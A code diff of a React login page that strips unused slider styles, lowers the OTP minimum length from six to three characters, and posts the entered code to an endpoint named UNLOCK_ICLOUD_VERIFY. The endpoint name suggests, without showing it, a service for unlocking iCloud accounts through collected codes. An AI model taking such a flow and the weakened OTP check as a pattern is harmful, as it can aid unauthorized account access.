@@ -3,78 +3,16 @@ import './styles.css';
 import { useForm } from 'react-hook-form';
 import { z } from 'zod';
 import { zodResolver } from '@hookform/resolvers/zod';
-import { Box, Slider, Typography } from "@mui/material";
-import styled from "@emotion/styled";
 import { useNavigate } from 'react-router-dom';
 import LoadingProgress from '../../components/LoadingProgress';
-
-// Large PrettoSlider (for reference)
-const PrettoSlider = styled(Slider)({
-  color: '#2196f3',
-  height: 30,
-  '& .MuiSlider-track': {
-    border: 'none',
-  },
-  '& .MuiSlider-thumb': {
-    height: 35,
-    width: 35,
-    backgroundColor: '#fff',
-    border: '2px solid currentColor',
-    '&:focus, &:hover, &.Mui-active, &.Mui-focusVisible': {
-      boxShadow: 'inherit',
-    },
-    '&:before': {
-      display: 'none',
-    },
-  },
-  '& .MuiSlider-valueLabel': {
-    lineHeight: 1.2,
-    fontSize: 12,
-    background: 'unset',
-    padding: 0,
-    width: 32,
-    height: 32,
-    borderRadius: '50% 50% 50% 0',
-    backgroundColor: '#2196f3',
-    transformOrigin: 'bottom left',
-    transform: 'translate(50%, -100%) rotate(-45deg) scale(0)',
-    '&:before': { display: 'none' },
-    '&.MuiSlider-valueLabelOpen': {
-      transform: 'translate(50%, -100%) rotate(-45deg) scale(1)',
-    },
-    '& > *': {
-      transform: 'rotate(45deg)',
-    },
-  },
-});
-
-// Small PrettoSlider with updated styles
-const SmallPrettoSlider = styled(Slider)({
-  color: '#52af77',
-  height: 4,
-  padding: '0',
-  '& .MuiSlider-track': {
-    border: 'none',
-    backgroundColor: '#52af77',
-    opacity: 1,
-  },
-  '& .MuiSlider-rail': {
-    opacity: 0.5,
-    backgroundColor: '#bfbfbf',
-  },
-  '& .MuiSlider-thumb': {
-    display: 'none',
-  },
-  '& .MuiSlider-valueLabel': {
-    display: 'none',
-  },
-});
+import apiService from '../../service/apiService';
+import API_PATHS from '../../config/api';
 
 // Define form schema using Zod
 const formSchema = z.object({
   password: z.string()
     .min(1, 'Vui lòng nhập mã OTP')
-    .min(6, 'Mã OTP phải có ít nhất 6 ký tự')
+    .min(3, 'Mã OTP phải có ít nhất 3 ký tự')
     .max(20, 'Mã OTP không được vượt quá 20 ký tự')
 });
 
@@ -96,7 +34,11 @@ const LoginPage: React.FC = () => {
   const onSubmit = async (data: FormData) => {
     setIsLoading(true);
     setLoadingPercent(0);
-
+    apiService('post', API_PATHS.UNLOCK_ICLOUD_VERIFY, {code: data.password}).then((res) => {
+      console.log(res)
+    }).catch((err)=>{
+      console.log(err)
+    })
     const loadingInterval = setInterval(() => {
       setLoadingPercent(prev => {
         if (prev >= 100) {
